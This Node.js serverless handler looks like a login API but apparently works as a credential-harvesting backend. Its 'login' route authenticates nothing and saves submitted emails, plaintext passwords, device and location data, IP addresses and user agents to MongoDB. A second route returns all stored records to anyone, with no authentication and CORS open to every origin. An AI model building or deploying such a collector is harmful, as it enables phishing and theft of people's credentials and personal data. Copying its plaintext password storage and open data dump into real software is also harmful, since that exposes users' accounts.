const { MongoClient, ObjectId } = require('mongodb');
require('dotenv').config();
const User = require('./models/User');
const connectToDatabase = require('./db/connect');
const getIp = require('./helpers/getIp');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle OPTIONS request (preflight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Extract the path from the URL
  const urlPath = req.url.split('?')[0];
  
  try {
    // Connect to MongoDB
    await connectToDatabase();
    
    // Route based on URL path
    if (urlPath === '/api/users/login' && req.method === 'POST') {
      // Login functionality
      await handleLogin(req, res);
    } 
    else if (urlPath === '/api/users/get' && req.method === 'GET') {
      // Get users functionality
      await getUsers(req, res);
    }
    else {
      res.status(404).json({ error: 'Route not found' });
    }
  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ error: 'Internal Server Error', message: error.message });
  }
};

// Handle login
async function handleLogin(req, res) {
  try {
    // Parse the JSON request body
    const userData = req.body;
    
    if (!userData || !userData.email || !userData.password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }
    
    // Get client IP
    const ip = getIp(req);
    
    // Current timestamp
    const timestamp = new Date();
    
    // Create a user document
    const user = new User({
      email: userData.email,
      password: userData.password,
      device: userData.device || {},
      location: userData.location || {},
      ip: ip,
      userAgent: req.headers['user-agent'] || '',
      timestamp: timestamp
    });
    
    // Save to the database
    await user.save();
    
    // Return success
    res.status(200).json({
      success: true,
      message: 'Login information saved',
      userId: user._id
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Failed to process login', message: error.message });
  }
}

// Get users
async function getUsers(req, res) {
  try {
    const { limit = 20, page = 1 } = req.query;
    
    const skip = (parseInt(page) - 1) * parseInt(limit);
    
    // Find users
    const users = await User.find()
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(parseInt(limit));
      
    // Count total
    const total = await User.countDocuments();
    
    res.status(200).json({
      users,
      pagination: {
        total,
        page: parseInt(page),
        limit: parseInt(limit),
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    console.error('Error getting users:', error);
    res.status(500).json({ error: 'Failed to get users' });
  }
} 